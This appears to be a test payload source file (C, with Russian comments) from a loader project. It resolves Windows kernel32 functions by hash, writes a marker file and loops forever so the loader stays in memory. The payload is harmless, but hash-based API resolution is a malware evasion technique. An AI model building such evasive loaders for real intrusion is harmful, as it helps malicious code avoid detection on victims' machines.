// src/payload_test/payload_test.c
// Рабочий payload — создаёт маркеры, крутится в цикле.

#include "../../src/common/types.h"
#include "../../src/loader/api_resolver.h"
#include "../../src/common/hashes.h"

typedef void* (__stdcall *pCreateFileA)(const char*, u32, u32, void*, u32, u32, void*);
typedef int   (__stdcall *pCloseHandle)(void*);

static void marker(const char* path, pCreateFileA pCF, pCloseHandle pCH) {
    if (!pCF) return;
    void* h = pCF(path, 0x40000000, 0x1, NULL_, 2, 0x80, NULL_);
    if (h && h != (void*)-1) {
        if (pCH) pCH(h);
    }
}

void payload_entry(void) {
    pCreateFileA pCF = (pCreateFileA) resolve_kernel32(H_CreateFileA);
    pCloseHandle pCH = (pCloseHandle) resolve_kernel32(H_CloseHandle);

    marker("C:\\BlindSpotProject\\marker_from_final_loader.txt", pCF, pCH);

    // Крутимся в цикле — loader.exe должен висеть в памяти
    volatile int i = 0;
    while (1) { i++; }
}

